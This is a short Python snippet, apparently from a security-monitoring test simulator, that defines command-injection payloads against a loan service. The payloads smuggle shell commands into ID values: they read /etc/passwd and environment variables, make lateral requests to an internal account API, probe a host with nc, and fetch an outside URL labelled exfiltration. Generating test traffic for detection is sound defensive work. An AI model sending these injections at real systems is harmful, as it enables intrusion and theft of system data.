...
def generate_test_traffic():
    print("Initializing OmniFinance SOC Test Simulator (RCE & SQLi)...")
    ...
    # 1. Command Injection (RCE) Payloads targeting the Loan Service
    rce_payloads = [
        "L-101; cat /etc/passwd",
        "L-102; env",
        "L-103; wget -qO- -T 2 http://account-service:5000/api/accounts?id=1", # Lateral Movement
        "L-104; nc -zv frontend-ui 80",
        "L-105; wget -qO- -T 2 http://example.com" # Exfiltration
    ]
